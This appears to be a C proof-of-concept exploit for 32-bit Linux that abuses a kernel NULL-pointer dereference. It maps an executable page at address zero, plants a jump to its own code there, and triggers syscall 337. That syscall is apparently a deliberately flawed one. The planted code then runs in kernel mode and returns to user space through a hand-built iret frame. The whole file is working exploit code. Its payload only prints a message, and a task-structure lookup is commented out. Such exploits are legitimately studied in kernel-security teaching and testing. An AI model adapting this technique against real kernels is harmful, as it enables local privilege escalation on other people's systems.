#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/mman.h>

char exit_stack[1024 * 1024];
int exit_code(void)
{
	printf("hello exit\n");
	return 0;
}

static inline __attribute__((always_inline)) void *get_current(void)
{
	unsigned long curr;
	asm volatile ("movl %%esp, %%eax ;"
			"andl %1, %%eax ;"
			"movl (%%eax), %0":"=r"(curr):"i"(~8191));
	return (void *)curr;
}

#define USER_SS 0x7b
#define USER_FL 0x246
#define USER_CS 0x73

static inline __attribute__((always_inline)) void exit_kernel(void)
{
	asm volatile (
		"movl %0, 0x10(%%esp) ;"
		"movl %1, 0xc(%%esp) ;"
		"movl %2, 8(%%esp) ;"
		"movl %3, 4(%%esp) ;"
		"movl %4, (%%esp) ;"
		"iret"
		::"i"(USER_SS), "r"(&exit_stack[1024*1024 - 40]),
			"i"(USER_FL), "i"(USER_CS), "r"(exit_code));

}

void kernel_code(void)
{
//	char *p;
//	p = get_current();	
	exit_kernel();	
}

int main()
{
	unsigned int ret;
	unsigned char *page;
	page = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC,
			MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, 0, 0);
	if (page == MAP_FAILED) {
		perror("mmap");	
		return -1;
	}
	printf("hack\n");
	page[0] = '\x90';	
	page[1] = '\xe9';	
	*(unsigned int *)&page[2] = (unsigned int)&kernel_code - 6;
	asm volatile ("int $0x80":"=a"(ret):"a"(337));
	return ret;
}
